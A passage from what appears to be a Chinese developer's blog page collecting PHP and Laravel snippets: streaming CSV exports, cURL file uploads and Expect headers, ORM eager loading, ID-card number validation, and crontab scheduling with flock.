class="line">&#125;</span><br><span class="line">fclose( $fp );</span><br><span class="line">$end = microtime( <span class="literal">true</span> );</span><br><span class="line">echo <span class="string">"cost : "</span>.( $end - $begin ).<span class="string">' sec'</span>.PHP_EOL;</span><br></pre></td></tr></table></figure>
<h3 id="下载超大数据量的Excel文件"><a href="#下载超大数据量的Excel文件" class="headerlink" title="下载超大数据量的Excel文件"></a>下载超大数据量的Excel文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 文章访问日志https://www.itcodemonkey.com/article/9909.html</span></span><br><span class="line"><span class="comment">   * 下载的日志文件通常很大, 所以先设置csv相关的Header头, 然后打开</span></span><br><span class="line"><span class="comment">   * PHP output流, 渐进式的往output流中写入数据, 写到一定量后将系统缓冲冲刷到响应中</span></span><br><span class="line"><span class="comment">   * 避免缓冲溢出</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">articleAccessLog</span>(<span class="params">$timeStart, $timeEnd</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      set_time_limit(<span class="number">0</span>);</span><br><span class="line">      $columns = [</span><br><span class="line">          <span class="string">'文章ID'</span>, <span class="string">'文章标题'</span>, ......</span><br><span class="line">      ];</span><br><span class="line">      $csvFileName = <span class="string">'用户日志'</span> . $timeStart .<span class="string">'_'</span>. $timeEnd . <span class="string">'.xlsx'</span>;</span><br><span class="line">      <span class="comment">//设置好告诉浏览器要下载excel文件的headers</span></span><br><span class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">      header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line">      header(<span class="string">'Content-Disposition: attachment; filename="'</span>. $fileName .<span class="string">'"'</span>);</span><br><span class="line">      header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">      header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">      header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">      $fp = fopen(<span class="string">'php://output'</span>, <span class="string">'a'</span>);<span class="comment">//打开output流</span></span><br><span class="line">      mb_convert_variables(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $columns);</span><br><span class="line">      fputcsv($fp, $columns);<span class="comment">//将数据格式化为CSV格式并写入到output流中</span></span><br><span class="line">      $accessNum = <span class="string">'1000000'</span><span class="comment">//从数据库获取总量，假设是一百万</span></span><br><span class="line">      $perSize = <span class="number">1000</span>;<span class="comment">//每次查询的条数</span></span><br><span class="line">      $pages   = ceil($accessNum / $perSize);</span><br><span class="line">      $lastId  = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= $pages; $i++) &#123;</span><br><span class="line">          $accessLog = $logService-&gt;getArticleAccessLog($timeStart, $timeEnd, $lastId, $perSize);</span><br><span class="line">          foreach($accessLog <span class="keyword">as</span> $access) &#123;</span><br><span class="line">              $rowData = [</span><br><span class="line">                  ......<span class="comment">//每一行的数据</span></span><br><span class="line">              ];</span><br><span class="line">              mb_convert_variables(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $rowData);</span><br><span class="line">              fputcsv($fp, $rowData);</span><br><span class="line">              $lastId = $access-&gt;id;</span><br><span class="line">          &#125;</span><br><span class="line">          unset($accessLog);<span class="comment">//释放变量的内存</span></span><br><span class="line">          <span class="comment">//刷新输出缓冲到浏览器</span></span><br><span class="line">          ob_flush();</span><br><span class="line">          flush();<span class="comment">//必须同时使用 ob_flush() 和flush() 函数来刷新输出缓冲。</span></span><br><span class="line">      &#125;</span><br><span class="line">      fclose($fp);</span><br><span class="line">      exit();</span><br><span class="line">  &#125;</span><br><span class="line">  SELECT columns FROM <span class="string">`table_name`</span> </span><br><span class="line">  WHERE <span class="string">`created_at`</span> &gt;= <span class="string">'time range start'</span> </span><br><span class="line">  AND <span class="string">`created_at`</span> &lt;= <span class="string">'time range end'</span> </span><br><span class="line">  AND  <span class="string">`id`</span> &lt; LastId </span><br><span class="line">  ORDER BY <span class="string">`id`</span> DESC </span><br><span class="line">  LIMIT num</span><br></pre></td></tr></table></figure>
<h3 id="判断一个图像的类型"><a href="#判断一个图像的类型" class="headerlink" title="判断一个图像的类型"></a>判断一个图像的类型</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (exif_imagetype(<span class="string">"image.gif"</span>) != IMAGETYPE_GIF) &#123;</span><br><span class="line">    echo <span class="string">"The picture is not a gif"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="给定任意数，计算是2的几次方"><a href="#给定任意数，计算是2的几次方" class="headerlink" title="给定任意数，计算是2的几次方"></a>给定任意数，计算是2的几次方</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">power</span>(<span class="params">$number</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (($number &amp; ($number - <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数学不好的,就看下面的方法https://blog.fastrun.cn/2018/07/21/1-31/</span></span><br><span class="line">        <span class="comment">// $number = decbin($number);</span></span><br><span class="line">        <span class="comment">// return (mb_strlen($number)-1);</span></span><br><span class="line">        <span class="comment">// 数学可以的就看下面的方法</span></span><br><span class="line">        <span class="keyword">return</span> floor(log($number,<span class="number">2</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CURL-发送文件-1"><a href="#CURL-发送文件-1" class="headerlink" title="CURL 发送文件"></a>CURL 发送文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/testFile"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ form 提交</span></span><br><span class="line"><span class="regexp">Route::any("/</span>testFile<span class="string">","</span>TestController@testFile<span class="string">");</span></span><br><span class="line"><span class="string">// form action 接收</span></span><br><span class="line"><span class="string">Route::any("</span>/testLoadFile<span class="string">","</span>TestController@testLoadFile<span class="string">");</span></span><br><span class="line"><span class="string">public function testFile(Request $request)&#123;</span></span><br><span class="line"><span class="string">        $data = array(</span></span><br><span class="line"><span class="string">            'file'=&gt; new \CURLFile(realpath($request-&gt;file('file')-&gt;path())),</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $ch = curl_init();</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_URL,"</span>/testLoadFile<span class="string">");//此处以当前服务器为接收地址</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_TIMEOUT,10);//设置最长等待时间</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_POST, 1);//post提交</span></span><br><span class="line"><span class="string">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $data = curl_exec($ch);//执行</span></span><br><span class="line"><span class="string">        if(curl_errno($ch))&#123;</span></span><br><span class="line"><span class="string">            return curl_error($ch);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        curl_close($ch);//释放</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return json_encode($data);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function testLoadFile(Request $request)&#123;</span></span><br><span class="line"><span class="string">            if ($request-&gt;hasFile('file')) &#123;</span></span><br><span class="line"><span class="string">                if ($request-&gt;file('file')-&gt;isValid())&#123;</span></span><br><span class="line"><span class="string">                    // 上传成功</span></span><br><span class="line"><span class="string">                    // 随机名字 . 后缀</span></span><br><span class="line"><span class="string">                    $fileName = "</span>other/<span class="string">".Date("</span>YmdHis<span class="string">").substr(md5(time()),5,15)."</span>.<span class="string">".$request-&gt;file("</span>file<span class="string">")-&gt;extension();// 需要 开启php_fileinfo 扩展 否则会报错</span></span><br><span class="line"><span class="string">                    // 获取临时上传的路径（如果不存在本地，则方法调用完之后，会被删除）</span></span><br><span class="line"><span class="string">                    //$fileUrl = $request-&gt;file('file')-&gt;path();</span></span><br><span class="line"><span class="string">                    // 可选存储在本地</span></span><br><span class="line"><span class="string">                    $fileUrl = $request-&gt;file("</span>file<span class="string">")-&gt;move(__DIR__."</span>/<span class="string">",$fileName);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">                    return ($fileUrl);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return json_encode([]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="流的方法导出-Excel"><a href="#流的方法导出-Excel" class="headerlink" title="流的方法导出 Excel"></a>流的方法导出 Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params">$params</span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           $columns = [<span class="string">'字段名'</span>];</span><br><span class="line"></span><br><span class="line">           $fileName = <span class="string">'GPS管理明细'</span> . <span class="string">'.csv'</span>;</span><br><span class="line">           <span class="comment">//设置好告诉浏览器要下载excel文件的headers https://learnku.com/articles/17829</span></span><br><span class="line">           header(<span class="string">'Content-Description: File Transfer'</span>);</span><br><span class="line">           header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line">           header(<span class="string">'Content-Disposition: attachment; filename="'</span>. $fileName .<span class="string">'"'</span>);</span><br><span class="line">           header(<span class="string">'Expires: 0'</span>);</span><br><span class="line">           header(<span class="string">'Cache-Control: must-revalidate'</span>);</span><br><span class="line">           header(<span class="string">'Pragma: public'</span>);</span><br><span class="line"></span><br><span class="line">           $fp = fopen(<span class="string">'php://output'</span>, <span class="string">'a'</span>);<span class="comment">//打开output流</span></span><br><span class="line">           mb_convert_variables(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $columns);</span><br><span class="line">           fputcsv($fp, $columns);     <span class="comment">//将数据格式化为CSV格式并写入到output流中</span></span><br><span class="line"></span><br><span class="line">           $num = $<span class="keyword">this</span>-&gt;getExportNum($params);</span><br><span class="line">           $perSize = <span class="number">2000</span>;<span class="comment">//每次查询的条数</span></span><br><span class="line">           $pages   = ceil($num / $perSize);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= $pages; $i++) &#123;</span><br><span class="line">               $list = $<span class="keyword">this</span>-&gt;getUnitExportData($params, $i, $perSize);</span><br><span class="line"></span><br><span class="line">               foreach($list <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                   $rowData[] = $<span class="keyword">this</span>-&gt;switchDeviceMakerToDesc($item[<span class="string">'device_maker'</span>]);</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   mb_convert_variables(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $rowData);</span><br><span class="line">                   fputcsv($fp, $rowData);</span><br><span class="line">                   unset($rowData);</span><br><span class="line">               &#125;</span><br><span class="line">               unset($accessLog);<span class="comment">//释放变量的内存</span></span><br><span class="line"></span><br><span class="line">               ob_flush();     <span class="comment">//刷新输出缓冲到浏览器</span></span><br><span class="line">               flush();        <span class="comment">//必须同时使用 ob_flush() 和flush() 函数来刷新输出缓冲。</span></span><br><span class="line">           &#125;</span><br><span class="line">           fclose($fp);</span><br><span class="line">           exit();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<h3 id="laravel-orm"><a href="#laravel-orm" class="headerlink" title="laravel orm"></a>laravel orm</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">取出一组热门作者及他们最近发表的<span class="number">3</span>篇文章</span><br><span class="line">$users = \App\Models\User::<span class="keyword">with</span>([<span class="string">'posts'</span> =&gt; <span class="function"><span class="keyword">function</span> (<span class="params">$query</span>) </span>&#123;</span><br><span class="line">    $query-&gt;limit(<span class="number">3</span>);</span><br><span class="line">&#125;])-&gt;limit(<span class="number">10</span>)-&gt;get();</span><br><span class="line">select</span><br><span class="line">  *</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  <span class="string">`posts`</span></span><br><span class="line">where</span><br><span class="line">  <span class="string">`posts`</span>.<span class="string">`user_id`</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">limit</span><br><span class="line">  <span class="number">3</span></span><br><span class="line">  </span><br><span class="line">  $users = \App\Models\User::limit(<span class="number">10</span>)-&gt;get();</span><br><span class="line">  </span><br><span class="line">  $users = $users-&gt;map(<span class="function"><span class="keyword">function</span> (<span class="params">$user</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//可以考虑$user-&gt;id缓存,在保证了速度的同时避免大面积的缓存重建</span></span><br><span class="line">      $user-&gt;posts = $user-&gt;posts()-&gt;limit(<span class="number">3</span>)-&gt;get();</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">return</span> $user;</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> $users;</span><br><span class="line">  SELECT</span><br><span class="line">      posts.*,</span><br><span class="line">      @number := IF (@current_user_id = <span class="string">`user_id`</span>, @number + <span class="number">1</span>, <span class="number">1</span>) AS number,</span><br><span class="line">      @current_user_id := <span class="string">`user_id`</span></span><br><span class="line">  FROM</span><br><span class="line">      (select * <span class="keyword">from</span> <span class="string">`posts`</span> where <span class="string">`posts`</span>.<span class="string">`user_id`</span> IN (<span class="number">572</span>, <span class="number">822</span>, <span class="number">911</span>, <span class="number">103</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">999</span>, <span class="number">333</span>, <span class="number">121</span>, <span class="number">122</span>) order by <span class="string">`posts`</span>.<span class="string">`user_id`</span> ASC) AS posts</span><br><span class="line">  HAVING</span><br><span class="line">      number &lt;= <span class="number">3</span></span><br><span class="line">      # User.php</span><br><span class="line">      </span><br><span class="line">      public <span class="function"><span class="keyword">function</span> <span class="title">latestPosts</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;belongsToMany(Post::<span class="class"><span class="keyword">class</span>, '<span class="title">user_latest_post</span>')</span></span><br><span class="line"><span class="class">      &#125;</span></span><br><span class="line">      使用https://learnku.com/articles/24787#topnav </span><br><span class="line">      </span><br><span class="line">      $users = \App\Models\User::<span class="keyword">with</span>([<span class="string">'latestPosts'</span>])-&gt;limit(<span class="number">10</span>)-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="curl时设置Expect"><a href="#curl时设置Expect" class="headerlink" title="curl时设置Expect"></a>curl时设置Expect</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在不设置 Expect 头信息使用 curl 发送 POST 请求时，如果 POST 数据大于 <span class="number">1</span>kb，curl 默认行为 如下：</span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/08/curl-expect-continue.html</span></span><br><span class="line">先追加一个Expect: <span class="number">100</span>-<span class="keyword">continue</span>请求头信息，发送这个不包含 POST 数据的请求；</span><br><span class="line">如果服务器返回的响应头信息中包含Expect: <span class="number">100</span>-<span class="keyword">continue</span>，则表示 Server 愿意接受数据，这时才 POST 真正数据给 Server；</span><br><span class="line"><span class="comment">// qq第三方api</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, array(<span class="string">'Expect:'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// guzzle的curl Adapter</span></span><br><span class="line"><span class="keyword">if</span> (!$request-&gt;hasHeader(<span class="string">'Expect'</span>)) &#123;</span><br><span class="line">    $conf[CURLOPT_HTTPHEADER][] = <span class="string">'Expect:'</span>;</span><br><span class="line">&#125;</span><br><span class="line">再次 tcpdump 抓包，发现使用 curl 发送超过 <span class="number">1</span>kb 的 POST 数据时，也并未出现 <span class="number">100</span>-<span class="keyword">continue</span> 的 HTTP 请求。</span><br></pre></td></tr></table></figure>
<h3 id="身份证的编码规则"><a href="#身份证的编码规则" class="headerlink" title="身份证的编码规则"></a>身份证的编码规则</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ID_15_PREG = <span class="string">'/^[1-9]\d&#123;7&#125;(0[1-9]|1[0-2])([0-2][1-9]|[1-2]0|31)\d&#123;3&#125;$/'</span>;</span><br><span class="line"><span class="comment">//https://www.fanhaobai.com/2017/08/id-card.html</span></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string($id) || empty($id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strlen($id) == <span class="number">15</span> &amp;&amp; preg_match(<span class="keyword">static</span>::ID_15_PREG, $id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> ID_18_PREG = <span class="string">'/^[1-9]\d&#123;5&#125;[1-9]\d&#123;3&#125;(0[1-9]|1[0-2])([0-2][1-9]|[1-2]0|31)(\d&#123;4&#125;|\d&#123;3&#125;[Xx])$/'</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string($id) || empty($id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strlen($id) == <span class="number">18</span> &amp;&amp; preg_match(<span class="keyword">static</span>::ID_18_PREG, $id) &amp;&amp; strtoupper($id[<span class="number">17</span>]) === self::getCheckBit($id)) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strlen($id) == <span class="number">15</span> &amp;&amp; preg_match(<span class="keyword">static</span>::ID_15_PREG, $id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">15</span> 位身份证转化为 <span class="number">18</span> 位的代码如下：</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">format18</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">static</span>::validate($id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">15</span> !== strlen($id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $id;</span><br><span class="line">    &#125;</span><br><span class="line">    $newId = substr($id, <span class="number">0</span>, <span class="number">6</span>) . <span class="string">'19'</span> . substr($id, <span class="number">-9</span>) . <span class="string">'X'</span>;</span><br><span class="line">    $newId[<span class="number">17</span>] = <span class="keyword">static</span>::getCheckBit($newId);</span><br><span class="line">    <span class="keyword">return</span> $newId;</span><br><span class="line">&#125;</span><br><span class="line">转化示例结果：</span><br><span class="line"></span><br><span class="line"><span class="comment">//15位---------------------18位</span></span><br><span class="line"><span class="string">'370725881105149'</span> =&gt; <span class="string">'37072519881105149X'</span></span><br></pre></td></tr></table></figure>
<h3 id="定时脚本"><a href="#定时脚本" class="headerlink" title="定时脚本"></a>定时脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">在不增加脚本文件可执行权限的情况，可以直接使用sh命令解决。</span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/07/php-cli-setting.html</span></span><br><span class="line"># 直接执行</span><br><span class="line">$ sh ./crontab.sh</span><br><span class="line"># crontab</span><br><span class="line">$ crontab -e</span><br><span class="line"><span class="number">10</span> <span class="number">0</span> * * * sh /mnt/hgfs/Code/ziroom/crontab/cli/crontab.sh &gt; <span class="regexp">/home/</span>log/cli.log</span><br><span class="line">单实例防并发</span><br><span class="line"></span><br><span class="line">脚本往往只需要单实例执行，甚至有时候启动多个实例并行执行会带来不可预期的错误。例如，一个脚本执行时间偶尔会超过 <span class="number">10</span> 分钟，而我又需要以每 <span class="number">5</span> 分钟的频率执行，那么不可避免的会出现多实例并发执行的异常情况，这时可以使用 文件锁 来保证脚本的单实例执行。</span><br><span class="line"></span><br><span class="line">当然，我们可以在脚本中实现文件锁，但是我们往往希望脚本只涉及到业务逻辑，这样方便维护。此时可以使用flock命令来解决：</span><br><span class="line"></span><br><span class="line"># flock文件锁</span><br><span class="line"><span class="number">5</span> * * * * <span class="regexp">/usr/</span>bin/flock -xn /<span class="keyword">var</span>/run/crontab.lock -c <span class="string">"/mnt/hgfs/Code/ziroom/crontab/cli/crontab.sh &gt; /home/log/cli.log"</span></span><br><span class="line">使用 flock 命令，一个明显的好处是不对业务有任何侵入，脚本只需关注业务逻辑。</span><br><span class="line"></span><br><span class="line">错误调试</span><br><span class="line"></span><br><span class="line">调试脚本时，遇到一些系统层面的错误问题，一般都不易发现，这时使用strace可以用来查看系统调用的执行，才是解决问题的根本。</span><br><span class="line"></span><br><span class="line">$ strace crontab.sh</span><br><span class="line"></span><br><span class="line">execve(<span class="string">"./crontab.sh"</span>, [<span class="string">"./crontab.sh"</span>], [<span class="comment">/* 29 vars */</span>]) = <span class="number">0</span></span><br><span class="line">brk(<span class="number">0</span>)                                  = <span class="number">0x106a000</span></span><br><span class="line">mmap(NULL, <span class="number">4096</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span 